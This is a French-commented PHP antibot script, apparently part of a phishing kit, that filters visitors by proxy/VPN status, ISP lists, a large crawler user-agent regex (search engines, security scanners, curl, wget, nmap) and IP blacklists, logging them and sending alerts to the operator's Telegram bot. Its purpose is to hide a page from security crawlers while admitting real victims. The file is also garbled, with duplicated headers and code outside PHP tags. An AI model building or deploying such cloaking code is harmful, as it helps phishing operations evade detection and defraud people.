<?php
include 'functions.php';

// Active le buffer de sortie pour éviter les erreurs "headers already sent"
ob_start();

// Désactive l'affichage des erreurs pour les utilisateurs finaux
error_reporting(0);
ini_set('display_errors', 0);

// Chargement de la liste des ISPs
$isps = @json_decode(@file_get_contents('../help/!#/isps.json'), true);
if (!$isps) {
    $isps = @json_decode(@file_get_contents('../../help/!#/isps.json'), true);
}

// Récupérer la langue de l'utilisateur
$_SESSION["lang"] = strtolower(substr($_SERVER["HTTP_ACCEPT_LANGUAGE"], 0, 2));
<?php
include 'functions.php';

# ISPS Liste
$isps = @json_decode(@file_get_contents('../help/!#/isps.json'), true);
if (!$isps) {
    $isps = @json_decode(@file_get_contents('../../help/!#/isps.json'), true);
}

$_SESSION["lang"] = strtolower(substr($_SERVER["HTTP_ACCEPT_LANGUAGE"], 0, 2));

# Crawler Liste
$crawler = '/007ac9|';

$ua = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];

# Fonction pour envoyer des notifications via Telegram
function sendWL($message, $chatid) {
    global $token;
  
    $query_params = array(
      'text' => $message,
      'chat_id' => $chatid
    );
  
    $reply_markup = array(
        'inline_keyboard' => array(
          array(
            array(
              'text' => '🫧 WhiteList ',
              'url' => "http://" . $_SERVER['SERVER_NAME'] . "/help/action/utils.php?wl=" . $_SERVER['REMOTE_ADDR']
            )
          ),
        )
      );
    $query_params['reply_markup'] = json_encode($reply_markup);

    if (function_exists('curl_version')) {
        $query_url = "https://api.telegram.org/bot$token/sendMessage";
        $curl = curl_init($query_url);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($query_params));
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
        curl_exec($curl);
        curl_close($curl);
    } else {
        $query_url = "https://api.telegram.org/bot$token/sendMessage?" . http_build_query($query_params);
        file_get_contents($query_url);
    }
}

# Validation de la présence de bots ou utilisateurs indésirables
function validate() {
    global $movement_track, $chatidclick, $isp, $org;
    if ($movement_track == 1) {
        $message = "─────────── ⋆⋅ 🤖 ⋅⋆ ───────────
  
🤖 Le robot (".$_SERVER['REMOTE_ADDR'].") a été ban par les antibots
                           
─────────── ⋆⋅ 📶 ⋅⋆ ───────────
  
🤖 ISP / ORG    : ".$isp." / ".$org."
📍 Adresse IP   : ".$_SERVER['REMOTE_ADDR']."
📡 User Agent   :".$_SERVER['HTTP_USER_AGENT']."";
        sendWL($message, $chatidclick);
    }
  
    # Stoppe l'exécution du script sans afficher quoi que ce soit
    exit(); 
}

# Fonction pour vérifier les ISPS et ORG
function CheckIspOrg($org, $isp, $isps) {
    foreach ($isps as $country => $ispList) {
        foreach ($ispList as $ispItem) {
            if (stripos(strtolower($isp), strtolower($ispItem)) !== false) {
                return false;
            }
        }
        foreach ($ispList as $ispItem) {
            if (stripos(strtolower($org), strtolower($ispItem)) !== false) {
                return false;
            }
        }
    }
    return true;
}

# Fonction pour vérifier si l'IP est dans la liste noire
function checkIP() {
    global $banned;
    $banned_values = explode(',', $banned);
    if (in_array($_SERVER['REMOTE_ADDR'],$banned_values)) {
        return true;
    }
    return false;
}

# Liste des IPs autorisées
$whitelisted_values = explode(',', $whitelist);

if (!in_array($_SERVER['REMOTE_ADDR'],$whitelisted_values)) {
    
    $isp = $_SESSION['isp'];
    $org = $_SESSION['org'];
    $proxy = $_SESSION['proxy'];
    $hosting = $_SESSION['hosting'];

    if ($proxy || $hosting) {
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "PROXY / VPN\n", FILE_APPEND);
        validate();  // Appelle la fonction de validation et arrête le script
    } elseif (CheckIspOrg($org, $isp, $isps)) {
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "ISPS / ORG\n", FILE_APPEND);
        validate();  // Appelle la fonction de validation et arrête le script
    } elseif (preg_match($crawler, $ua) || preg_match($crawler, $isp)) {
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "Crawler USER-AGENT\n", FILE_APPEND);
        validate();  // Appelle la fonction de validation et arrête le script
    } elseif (checkIP()) {
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "BLACKLIST\n", FILE_APPEND);
        validate();  // Appelle la fonction de validation et arrête le script
    } else {
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/ip.txt', $ip . ' - ' . date('d/m/Y h:i:s') . "\n", FILE_APPEND);
    }
} else {
    file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/ip.txt', $ip . ' - ' . date('d/m/Y h:i:s') . "\n", FILE_APPEND);
}

# Vérification du captcha
if (!isset($_SESSION['captcha'], $_SESSION['captchaToken']) || $_SESSION['captcha'] != true) {
    header('Location: /');  // Redirige si le captcha échoue
    exit();  // Assure l'arrêt immédiat du script
}

?>

// Liste des crawlers
$crawler = '/007ac9|192.comAgent|360Spider|4seohuntbot|80legs|a6-indexer|Aboundex|AbusiveBot|accelobot|acoonbot|AddThis|ADmantX|AdsBot|adscanner|adbeat|adblade|adeptivemedia|adressendeutschland|adrelevance|adroll|adstxt|adunitsolutions|adversarial-ml|adwatch|adxbid|aggregator:|ahrefsbot|aihitbot|aiohttp|airmailbot|akamai-sitesnapshot|akamai|akamai.netstoragebot|akamaiorigin|alibaba|alisamobile|alligator|almaden|amagit|amznkassocbot|analyzer|android|anonymous|anonymous-bot|answerbot|antabot|antispam|antibot|anysite|AOL|apache-httpclient|AportWorm|appengine-google|arabot|arachmo|archive.org_bot|archive.orgbot|arquivo-web-crawler|asafaweb|aserv|asianbot|Ask Jeeves|aspseek|astickymess|asterias|atnbot|attentio|attrapub|attribution|autoemailspider|autowebdir|avsearch|axelspringer|axiomtelecom|BackDoorBot|backlink-checker|backlinkcrawler|backstreet|backweb|bad-ass|Bad-Neighborhood|Baidu|BaiDuSpider|Bandit|bangbangbot|Barkrowler|batchftp|baypup|bdfetch|beamusupscotty|beautybot|BebopBot|BecomeBot|bedwig|BeebwareDirectory|beetlebot|bender|betaBot|bigbrother|Bigfoot|BigWebDirectory|bingbot|BingPreview|binlar|biocrawler|Bionic|bitlybot|bitvoxybot|bizbot|blackwidow|BLM-Crawler|Blogdigger|bloglines|blogpulse|blogsearch|blogshares|blogslive|blowfish|bluefish|blitzbot|bnf.fr_bot|boitho|boochbot|bookmark-manager|boris|Boston-Project|boutell[-_]bot|boxseabot|BPImageWalker|BpSpider|Brandprotect|Brandprotectbot|brokore|BSDSeekBot|browsershots|btbot|btdigg|builtbottough|bullseye|bumblebee|bunnybot|buscador|Butterfly|buzzbot|byindia|byindia.com|c-sensor|c4-bot|cachedview|calyxinstitute|Camcrawler|CamelStampede|cancerbot|Canon|Canon-WebRecord|captain|careerbot|careerseeker|carleson|casperbot|caster|catexplorador|catfood|ccbot|CCGCrawl|cd-preload|centurybot|cerberian|ceron.jp_bot|cert figleafbot|cfbot|cg-eye|cha0s\/\/net|changedetection|changesbot|Charlotte|Checkbot|checkprivacy|CherryPicker|chinaclaw|cipinetbot|citeseerxbot|abacho|accona|AddThis|AdsBot|ahoy|AhrefsBot|AISearchBot|alexa|altavista|anthill|appie|applebot|arale|araneo|AraybOt|ariadne|arks|aspseek|ATN_Worldwide|Atomz|baiduspider|baidu|bbot|bingbot|bing|Bjaaland|BlackWidow|BotLink|bot|boxseabot|bspider|calif|CCBot|ChinaClaw|christcrawler|CMC\/0\.01|combine|confuzzledbot|contaxe|CoolBot|cosmos|crawler|crawlpaper|crawl|curl|cusco|cyberspyder|cydralspider|dataprovider|digger|DIIbot|DotBot|downloadexpress|DragonBot|DuckDuckBot|dwcp|EasouSpider|ebiness|ecollector|elfinbot|esculapio|ESI|esther|eStyle|Ezooms|facebookexternalhit|facebook|facebot|fastcrawler|FatBot|FDSE|FELIX IDE|fetch|fido|find|Firefly|fouineur|Freecrawl|froogle|gammaSpider|gazz|gcreep|geona|Getterrobo-Plus|get|girafabot|golem|googlebot|\-google|grabber|GrabNet|griffon|Gromit|gulliver|gulper|hambot|havIndex|hotwired|htdig|HTTrack|ia_archiver|iajabot|IDBot|Informant|InfoSeek|InfoSpiders|INGRID\/0\.1|inktomi|inspectorwww|Internet Cruiser Robot|irobot|Iron33|JBot|jcrawler|Jeeves|jobo|KDD\-Explorer|KIT\-Fireball|ko_yappo_robot|label\-grabber|larbin|legs|libwww-perl|linkedin|Linkidator|linkwalker|Lockon|logo_gif_crawler|Lycos|m2e|majesticsEO|marvin|mattie|mediafox|mediapartners|MerzScope|MindCrawler|MJ12bot|mod_pagespeed|moget|Motor|msnbot|muncher|muninn|MuscatFerret|MwdSearch|NationalDirectory|naverbot|NEC\-MeshExplorer|NetcraftSurveyAgent|NetScoop|NetSeer|newscan\-online|nil|none|Nutch|ObjectsSearch|Occam|openstat.ru\/Bot|packrat|pageboy|ParaSite|patric|pegasus|perlcrawler|phpdig|piltdownman|Pimptrain|pingdom|pinterest|pjspider|PlumtreeWebAccessor|PortalBSpider|psbot|rambler|Raven|RHCS|RixBot|roadrunner|Robbie|robi|RoboCrawl|robofox|Scooter|Scrubby|Search\-AU|searchprocess|search|SemrushBot|Senrigan|seznambot|Shagseeker|sharp\-info\-agent|sift|SimBot|Site Valet|SiteSucker|skymob|SLCrawler\/2\.0|slurp|snooper|solbot|speedy|spider_monkey|SpiderBot\/1\.0|spiderline|spider|suke|tach_bw|TechBOT|TechnoratiSnoop|templeton|teoma|titin|topiclink|twitterbot|twitter|UdmSearch|Ukonline|UnwindFetchor|URL_Spider_SQL|urlck|urlresolver|Valkyrie libwww\-perl|verticrawl|Victoria|void\-bot|Voyager|VWbot_K|wapspider|WebBandit\/1\.0|webcatcher|WebCopier|WebFindBot|WebLeacher|WebMechanic|WebMoose|webquest|webreaper|webspider|webs|WebWalker|WebZip|wget|whowhere|winona|wlm|WOLP|woriobot|WWWC|XGET|xing|yahoo|YandexBot|YandexMobileBot|yandex|yeti|cizilla.com|clariabot|clshttp|clushbot|cmsworldmap|coccoc|collapsar|collector|comodo|conceptbot|conducivebot|convera|CoolBot|coolcheck|Copernic|copyscape|copyright-bot|cosmos|Covario-IDS|crawl|CrawlDaddy|crawltrack|cronjob|crossrefbot|crowdflower|Crowsnest|cse.google|cuill|curiousgeorge|curl|currybot|custo|cyberalert|cyberdog|CyberPatrol|cyveillance|d1garabicengine|DA|dailymotion|danishbot|darenet|dasblog|datafountains|DataparkSearch|dataprovider|Daum|davebot|daypopbot|dbot|dc-sakura|dCSbot|deepindex|deepnet|deeptrawl|dejan|deliciousbot|dell\s+sputnik|demandbase-bot|deploybot|dergru|detector|devon|deweb|dmoz|DNLbot|dotbot|dotcombot|dotlinkbot|downloadhelper|dvbbot|e-bot|ecbot|ecrawl|ehtmlparser|eindexbot|elbot|email|engine|enliven|ericssonbot|ess-search|etcyourbot|expbot|express|extbot|extrabot|f2c-crawler|fbdatafetcher|feedbot|ff-bot|fileboston|findbot|finders|finetuning|forbidden|freebot|garbusearch|garcinia-bot|gebot|gdcbot|ggcsearch|glutenbot|gnubot|go-bot|golbot|grovio|guideb|hackbot|haxbot|heymelody|hrbot|hxbot|ibm-bots|icuri|infotopia|info\_seeker|interactions|jangobot|joind.in|linkchecker|lwp\-robot|maillistmanager|markethive|Mediacom-Black|mediapost|mediaq|mindbot|minercrawl|mmverify|mndesktop|motionagent|muse|nagbot|navigatorbot|nimrod|nmap|nosearch|nutshell|ocsbot|oasbot|open\-bot|openbot|ormbot|osbot|ozziobot|parser|pegobot|picget|planzbot|pluginbot|public\-index|quora|robots\-txt|scrapbot|sella\-bot|spider\.pl|spiderbot|spock|spotbot|spraybot|statbot|stobot|svnbot|sweepbot|tangentbot|targetbot|tembot|theorybot|thermobot|torcrawler|turingbot|urlbot|ursobot|ussearch|v9bot|voteit|waistbot|waterbot|webspider|weirdbot|workbot|wroclawbot|wwebspider|www.ciurlbot|XML_Spider|zizo.bot|zyborg|draftkingsbot|Fetch|Sumobot|Yoast|Yahoo\\-bot|Yandex|Naverbot|WappalyzerBot|XLSearchBot|Xunsearch\-bot|Xxxbot|YandexDirectCrawler|YandexBot|YQbot|crossrul|exabot|infozilla|googlebot\-countrybot|sogoubot|SogouTestBot|similarsitesbot|turingbot|whatsmyip|wetgrubs|woolworthsbot|yacy|Yeti|gaugebot|twitterbot|facebook|clearbot|gfpsearch|ltbotsbot|newrelicbot/i';

if (preg_match("/$crawler/i", $_SERVER['HTTP_USER_AGENT'])) {
    exit; // Empêche les robots d'accéder à cette page.
}


ob_end_flush();  // Libère le buffer de sortie

?>
